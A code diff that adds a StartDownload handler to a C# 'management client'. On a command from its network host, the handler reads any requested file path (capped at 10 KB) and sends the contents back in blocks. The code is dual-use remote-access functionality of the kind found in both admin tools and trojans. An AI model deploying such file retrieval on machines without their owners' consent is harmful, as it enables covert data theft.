@@ -3,23 +3,52 @@ using SharedCode.Network;
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Text;
 
 namespace MLManagementClient.Handlers
 {
     public static class FileManagerHandler
     {
         private static IClientConnection NetworkHost = null;
+        
+
         public static void SetNetworkHost(IClientConnection _connection)
         {
             NetworkHost = _connection;
         }
 
+
         public static void Handle(object[] data)
         {
             FileManagerCommand command = (FileManagerCommand)data[1];
             Console.WriteLine("File Manager: {0}", command.ToString());
+
+
+           if(command == FileManagerCommand.StartDownload)
+            {
+                string handle = (string)data[2];
+                string path = (string)data[3];
+                try
+                {
+                    using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read))
+                    {
+                        if (fs.Length > 10000) //10kb
+                            throw new Exception("File Too big");
+                        byte[] buffer = new byte[1000];
+                        int bytesread = 0;
+                        while((bytesread = fs.Read(buffer, 0, buffer.Length)) > 0)
+                        {
+                            byte[] block = new byte[bytesread];
+                            Buffer.BlockCopy(buffer, 0, block, 0, bytesread);
+                            NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.DownloadBlock, handle, block, fs.Position == fs.Length);
+                        }
+                    }
+                }
+                catch(Exception ex)
+                {
+                    NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.DownloadInvalid, handle, ex.Message);
+                }
+            }
+
             if(command == FileManagerCommand.Update)
             {
                 string path = (string)data[2];
